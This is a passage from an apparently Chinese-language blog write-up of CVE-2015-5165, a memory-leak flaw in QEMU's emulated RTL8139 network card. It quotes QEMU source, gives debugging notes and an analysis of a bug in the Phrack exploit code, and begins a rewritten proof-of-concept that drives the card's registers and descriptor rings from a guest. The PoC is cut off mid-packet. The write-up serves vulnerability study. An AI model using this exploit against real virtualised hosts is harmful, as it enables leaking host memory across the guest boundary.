class="line">    RTL8139State *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> MAC0 ... MAC0+<span class="number">4</span>:</span><br><span class="line">            s-&gt;phys[addr - MAC0] = val;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">        <span class="keyword">case</span> TxPoll:</span><br><span class="line">            DPRINTF(<span class="string">"C+ TxPoll write(b) val=0x%02x\n"</span>, val);</span><br><span class="line">            <span class="keyword">if</span> (val &amp; (<span class="number">1</span> &lt;&lt; <span class="number">7</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">"C+ TxPoll high priority transmission (not "</span></span><br><span class="line">                    <span class="string">"implemented)\n"</span>);</span><br><span class="line">                <span class="comment">//rtl8139_cplus_transmit(s);</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (val &amp; (<span class="number">1</span> &lt;&lt; <span class="number">6</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">"C+ TxPoll normal priority transmission\n"</span>);</span><br><span class="line">                rtl8139_cplus_transmit(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当往 <code>TxPoll</code> 写入数据时，可以触发 <code>C+ TxPoll normal priority transmission</code> ，即调用函数 <code>rtl8139_cplus_transmit</code> ，定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_cplus_transmit</span><span class="params">(RTL8139State *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> txcount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (rtl8139_cplus_transmit_one(s))</span><br><span class="line">    &#123;</span><br><span class="line">        ++txcount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark transfer completed */</span></span><br><span class="line">    <span class="keyword">if</span> (!txcount)</span><br><span class="line">    &#123;</span><br><span class="line">        DPRINTF(<span class="string">"C+ mode : transmitter queue stalled, current TxDesc = %d\n"</span>,</span><br><span class="line">            s-&gt;currCPlusTxDesc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* update interrupt status */</span></span><br><span class="line">        s-&gt;IntrStatus |= TxOK;</span><br><span class="line">        rtl8139_update_irq(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数会循环调用 <code>rtl8139_cplus_transmit_one</code> ，也就是存在漏洞的函数！</p><h3 id="4-4-漏洞触发"><a href="#4-4-漏洞触发" class="headerlink" title="4.4 漏洞触发"></a>4.4 漏洞触发</h3><p>弄清楚漏洞的原理之后，编写 PoC 就比较简单了！对 Linux 和硬件接触不多的初学者（比如笔者自己），建议尝试理解每一行代码的作用，遇到不懂的概念就 Google 一下，代码不 Work 就 Debug 一下，在这个过程中可以学到很多新的知识，这也正是分析该漏洞的出发点。</p><p>在主机中可以通过 GDB 附加到 QEMU 进程 <code>qemu-system-x86</code> 进行调试，触发漏洞的位置如下：</p><p><img src="/uploads/202006/qemu-gdb-debug.png" alt="GDB 调试 QEMU 漏洞 CVE-2015-5165"></p><p><strong>调试过程中遇到的几个坑：</strong></p><p><strong>(I)</strong> 在构造数据包时，Ethernet Frame 的源 MAC 地址、目标 MAC 地址需要填充为 QEMU 虚拟机 RTL8139 网卡的 MAC 地址，通过 <code>ifconfig -a</code> 命令可以查看本机所有网卡的数据；笔者一开始使用的 <code>ifconfig</code> 命令，结果偏偏没有打印 RTL8139 网卡的信息，导致填充了错误的 MAC 地址，通过调试 QEMU 进程才发现 MAC 地址不一致；</p><p><strong>(II)</strong> Phrack 文章 [1] 提供的 Exploit 代码中 <code>rtl8139_tx_desc</code> 是栈上的局部变量，实际测试时发现获取不到在内存中的物理地址（Guest Physical Address），改为从堆上动态申请内存即可；调试发现是笔者自己实现的获取物理内存地址的代码有问题，因为栈的地址很高，转换成有符号数是一个负数，所以在调用 <code>fseek</code> 的时候需要处理好符号问题，否则 <code>fseek</code> 会失败；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">&#123;</span><br><span class="line">    fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">    <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">    &#123;</span><br><span class="line">        pfn &amp;= PFN_PFN;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>(III)</strong> 在 QEMU 虚拟机测试 PoC 时，发现打印接收到的数据的时候进程 Crash 了，从打印出来的调用栈来看，应该是接收缓冲区溢出了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ./a.out</span></span><br><span class="line">*** Error in `./a.out': corrupted size vs. prev_size: 0x092975e8 ***</span><br><span class="line">======= Backtrace: =========</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x67377)[0xb75af377]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x6d2f7)[0xb75b52f7]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x6f979)[0xb75b7979]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(__libc_malloc+0xc5)[0xb75b8fc5]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_file_doallocate+0x6e)[0xb75a592e]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_doallocbuf+0x47)[0xb75b31c7]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_file_overflow+0x1c1)[0xb75b2561]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_file_xsputn+0x94)[0xb75b1684]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x193)[0xb758a253]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_printf+0x26)[0xb7591696]</span><br><span class="line">./a.out[0x8048b1e]</span><br><span class="line">./a.out[0x8048c61]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xb7560637]</span><br><span class="line">./a.out[0x80485b1]</span><br></pre></td></tr></table></figure><p>调试发现 Phrack 文章 [1] 末尾给出的代码存在一个 Bug，而这个 Bug 居然没有人发现，笔者搜索了国内相关的技术文章，发现都照搬了这个 Bug 。其他人没有发现这里的问题，可能是由于分析环境的不同所造成的：</p><ul><li>笔者的 QEMU 虚拟机中安装的是 Ubuntu 官方发行的 Server 版本</li><li>其他文章中的 QEMU 虚拟机中安装的是临时编译的 Linux 系统</li></ul><p>对该 Bug 的分析如下：</p><ol><li>函数 <code>rtl8139_cplus_transmit_one</code> 在发送分片后的 Ethernet Frame 时，数据包的大小是 <code>1514</code> 字节；</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">uint16_t</span> chunk_size = tcp_chunk_size;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">int</span> tso_send_size = ETH_HLEN + hlen + tcp_hlen + chunk_size;</span><br><span class="line">rtl8139_transfer_frame(s, saved_buffer, tso_send_size,</span><br><span class="line">    <span class="number">0</span>, (<span class="keyword">uint8_t</span> *) dot1q_buffer);</span><br></pre></td></tr></table></figure><ol start="2"><li>因为是发给本机的数据，所以执行流程经由 <code>rtl8139_transfer_frame</code> 进入 <code>rtl8139_do_receive</code> ，这里会检查接收缓冲区是否还有多余的 <code>4</code> 字节空间用于填充 Checksum ；</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint32_t</span> rx_space = rxdw0 &amp; CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">if</span> (size+<span class="number">4</span> &gt; rx_space)</span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">"C+ Rx mode : descriptor %d size %d received %d + 4\n"</span>,</span><br><span class="line">        descriptor, rx_space, size);</span><br><span class="line">    <span class="comment">// error handling ......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">dma_addr_t</span> rx_addr = rtl8139_addr64(rxbufLO, rxbufHI);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* receive/copy to target memory */</span></span><br><span class="line"><span class="keyword">if</span> (dot1q_buf) &#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    pci_dma_write(d, rx_addr, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="comment">/* write checksum */</span></span><br><span class="line">val = cpu_to_le32(crc32(<span class="number">0</span>, buf, size_));</span><br><span class="line">pci_dma_write(d, rx_addr+size, (<span class="keyword">uint8_t</span> *)&amp;val, <span class="number">4</span>);</span><br></pre></td></tr></table></figure><ol start="3"><li>Phrack 文章 [1] 对接收缓冲区的设置位于函数 <code>rtl8139_desc_config_rx</code> ，可以每一个 <code>ring / descriptor</code> 关联的缓冲区的大小是 <code>RTL8139_BUFFER_SIZE</code> 即 <code>1514</code> 字节，但是 <code>dw0</code> 标志中设置的大小却是 <code>USHRT_MAX</code> 即 <code>65535</code> ；</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(struct rtl8139_ring *ring,</span></span></span><br><span class="line"><span class="function"><span class="params">                            struct rtl8139_desc *desc, <span class="keyword">int</span> nb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> addr;</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nb; i++) &#123;</span><br><span class="line">ring[i].desc = &amp;desc[i];</span><br><span class="line"><span class="built_in">memset</span>(ring[i].desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line"></span><br><span class="line">ring[i].buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line"><span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, RTL8139_BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">addr = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line"></span><br><span class="line">ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line"><span class="keyword">if</span> (i == nb - <span class="number">1</span>)</span><br><span class="line">ring[i].desc-&gt;dw0 |= CP_RX_EOR;</span><br><span class="line">ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line">ring[i].desc-&gt;dw0 |= USHRT_MAX;</span><br><span class="line">ring[i].desc-&gt;buf_lo = addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addr = (<span class="keyword">uint32_t</span>)gva_to_gpa(desc);</span><br><span class="line">outl(addr, RTL8139_PORT + RxRingAddrLO);</span><br><span class="line">outl(<span class="number">0x0</span>, RTL8139_PORT + RxRingAddrHI);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>这样的设置显然是不对的，这会导致可以通过函数 <code>rtl8139_do_receive</code> 中的缓冲区大小检查，后面在写入 Checksum 时会导致堆块越界写，这就是导致 QEMU 虚拟机中 PoC 进程 Crash 的原因；</li></ol><p>参考 Phrack 文章的代码，笔者重写的一份用于测试 CVE-2015-5165 的完整 PoC 代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页面相关参数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Ethernet Frame 大小</span></span><br><span class="line"><span class="comment">// DST(6) + SRC(6) + Length/Type(2) + PayloadMTU(1500)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_BUFFER_SIZE 1514</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 网卡 PMIO 地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_PORT 0xc000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Rx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// w0 end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// Rx buffer size mask 表示 0 ~ 12 位为 buffer size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_BUFFER_SIZE_MASK ((1&lt;&lt;13) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// Tx end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// last segment of received packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LS (1&lt;&lt;28)</span></span><br><span class="line"><span class="comment">// large send packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LGSEN (1&lt;&lt;27)</span></span><br><span class="line"><span class="comment">// IP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_IPCS (1&lt;&lt;18)</span></span><br><span class="line"><span class="comment">// TCP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TCPCS (1&lt;&lt;16)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 网卡寄存器偏移地址</span></span><br><span class="line"><span class="keyword">enum</span> RTL8139_registers </span><br><span class="line">&#123;</span><br><span class="line">    TxAddr0      = <span class="number">0x20</span>,    <span class="comment">// Tx descriptors address</span></span><br><span class="line">    ChipCmd      = <span class="number">0x37</span>,</span><br><span class="line">    TxConfig     = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig     = <span class="number">0x44</span>,</span><br><span class="line">    TxPoll       = <span class="number">0xD9</span>,    <span class="comment">// tell chip to check Tx descriptors for work</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>,    <span class="comment">// C+ Command register (C+ mode only)</span></span><br><span class="line">    <span class="comment">// 虽然名字写的 RxRingAddr, 但实际上是 Rx descriptor 的地址</span></span><br><span class="line">    RxRingAddrLO = <span class="number">0xE4</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">    RxRingAddrHI = <span class="number">0xE8</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_tx_config_bits </span><br><span class="line">&#123;</span><br><span class="line">    TxLoopBack = (<span class="number">1</span> &lt;&lt; <span class="number">18</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>), <span class="comment">// enable loopback test mode</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_rx_mode_bits </span><br><span class="line">&#123;</span><br><span class="line">    AcceptErr       = <span class="number">0x20</span>,</span><br><span class="line">    AcceptRunt      = <span class="number">0x10</span>,</span><br><span class="line">    AcceptBroadcast = <span class="number">0x08</span>,</span><br><span class="line">    AcceptMulticast = <span class="number">0x04</span>,</span><br><span class="line">    AcceptMyPhys    = <span class="number">0x02</span>,</span><br><span class="line">    AcceptAllPhys   = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_CplusCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlusRxVLAN   = <span class="number">0x0040</span>, <span class="comment">/* enable receive VLAN detagging */</span></span><br><span class="line">    CPlusRxChkSum = <span class="number">0x0020</span>, <span class="comment">/* enable receive checksum offloading */</span></span><br><span class="line">    CPlusRxEnb    = <span class="number">0x0002</span>,</span><br><span class="line">    CPlusTxEnb    = <span class="number">0x0001</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RT8139_ChipCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CmdReset    = <span class="number">0x10</span>,</span><br><span class="line">    CmdRxEnb    = <span class="number">0x08</span>,</span><br><span class="line">    CmdTxEnb    = <span class="number">0x04</span>,</span><br><span class="line">    RxBufEmpty  = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL8139_TxPollBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlus = <span class="number">0x40</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx descriptor</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx ring</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_ring</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span>* <span class="title">desc</span>;</span></span><br><span class="line">    <span class="keyword">void</span>* buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> rtl8139_packet[] = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Ethernet Frame Header 数据</span></span><br><span class="line">    <span class="comment">// DST MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// SRC MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// Length / Type: IPv4</span></span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Ethernet Frame Payload 数据, 即 IPv4 数据包</span></span><br><span class="line">    <span class="comment">// Version &amp; IHL(Internet Header Length)</span></span><br><span class="line">    (<span class="number">0x04</span> &lt;&lt; <span class="number">4</span>) | <span class="number">0x05</span>,    <span class="comment">// 0x05 * 4 = 20 bytes</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span 